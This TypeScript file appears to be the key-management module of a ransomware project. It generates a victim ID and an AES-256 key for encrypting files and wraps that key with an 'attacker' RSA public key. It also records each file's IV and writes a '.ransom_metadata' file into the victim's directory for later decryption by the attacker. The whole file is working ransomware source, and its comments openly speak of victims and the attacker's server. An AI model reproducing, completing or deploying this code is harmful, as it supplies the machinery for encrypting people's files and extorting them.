import crypto from 'crypto'
import fs from 'fs'
import path from 'path'
import { encryptRSA, decryptRSA, generateRSAKeys } from '../rsaComm'

// Store victim and attacker information
interface KeyInfo {
    victimId: string
    aesKey: Buffer
    ivMap: Map<string, Buffer> // Maps file paths to their IVs
}

// Store key info in memory (would be persisted in a real scenario)
const victimKeyStore = new Map<string, KeyInfo>()

// Generate a unique ID for the victim
export function generateVictimId(): string {
    return crypto.randomBytes(8).toString('hex')
}

// Initialize the key management for a new victim
export function initializeKeyManagement(): {
    victimId: string
    aesKey: Buffer
    attackerPublicKey: string
    attackerPrivateKey: string // In a real scenario, this would be kept on the attacker's server
} {
    // Generate a unique ID for the victim
    const victimId = generateVictimId()

    // Generate an AES-256 key for file encryption
    const aesKey = crypto.randomBytes(32)

    // Generate RSA key pair for the attacker
    const { publicKey, privateKey } = generateRSAKeys()

    // Store the victim's information
    victimKeyStore.set(victimId, {
        victimId,
        aesKey,
        ivMap: new Map<string, Buffer>()
    })

    return {
        victimId,
        aesKey,
        attackerPublicKey: publicKey,
        attackerPrivateKey: privateKey
    }
}

// Store the IV used for a specific file
export function storeFileIV(
    victimId: string,
    filePath: string,
    iv: Buffer
): void {
    const keyInfo = victimKeyStore.get(victimId)

    if (!keyInfo) {
        throw new Error(`Victim ID ${victimId} not found`)
    }

    keyInfo.ivMap.set(filePath, iv)
}

// Get the IV for a specific file
export function getFileIV(victimId: string, filePath: string): Buffer {
    const keyInfo = victimKeyStore.get(victimId)

    if (!keyInfo) {
        throw new Error(`Victim ID ${victimId} not found`)
    }

    const iv = keyInfo.ivMap.get(filePath)

    if (!iv) {
        throw new Error(`IV for file ${filePath} not found`)
    }

    return iv
}

// Encrypt the AES key with the attacker's public key
export function encryptAESKey(
    aesKey: Buffer,
    attackerPublicKey: string
): Buffer {
    // Convert the AES key to a hex string for encryption
    const aesKeyHex = aesKey.toString('hex')

    // Encrypt the AES key with the attacker's public key
    return encryptRSA(aesKeyHex, attackerPublicKey)
}

// Decrypt the AES key with the attacker's private key
export function decryptAESKey(
    encryptedAESKey: Buffer,
    attackerPrivateKey: string
): Buffer {
    // Decrypt the AES key hex string
    const aesKeyHex = decryptRSA(encryptedAESKey, attackerPrivateKey)

    // Convert the hex string back to a Buffer
    return Buffer.from(aesKeyHex, 'hex')
}

// Create a metadata file with encrypted keys and IVs for each file
export function createKeyMetadataFile(
    victimId: string,
    encryptedAESKey: Buffer,
    targetDir: string
): void {
    const keyInfo = victimKeyStore.get(victimId)

    if (!keyInfo) {
        throw new Error(`Victim ID ${victimId} not found`)
    }

    // Convert the IV map to a serializable object
    const ivMapObj: Record<string, string> = {}

    keyInfo.ivMap.forEach((iv, filePath) => {
        // Use relative paths for better portability
        const relativePath = path.relative(targetDir, filePath)
        ivMapObj[relativePath] = iv.toString('base64')
    })

    // Create the metadata object
    const metadata = {
        victimId,
        encryptedAESKey: encryptedAESKey.toString('base64'),
        ivMap: ivMapObj
    }

    // Write the metadata to a file
    fs.writeFileSync(
        path.join(targetDir, '.ransom_metadata'),
        JSON.stringify(metadata, null, 2)
    )
}

// Read the metadata file to get encrypted keys and IVs
export function readKeyMetadataFile(
    metadataPath: string,
    targetDir: string
): {
    victimId: string
    encryptedAESKey: Buffer
    ivMap: Map<string, Buffer>
} {
    // Read the metadata file
    const metadataStr = fs.readFileSync(metadataPath, 'utf8')
    const metadata = JSON.parse(metadataStr)

    // Convert the IV map back to a Map object
    const ivMap = new Map<string, Buffer>()

    Object.entries(metadata.ivMap).forEach(([relativePath, ivBase64]) => {
        // Convert relative paths back to absolute paths
        const absolutePath = path.join(targetDir, relativePath)
        ivMap.set(absolutePath, Buffer.from(ivBase64 as string, 'base64'))
    })

    return {
        victimId: metadata.victimId,
        encryptedAESKey: Buffer.from(metadata.encryptedAESKey, 'base64'),
        ivMap
    }
}
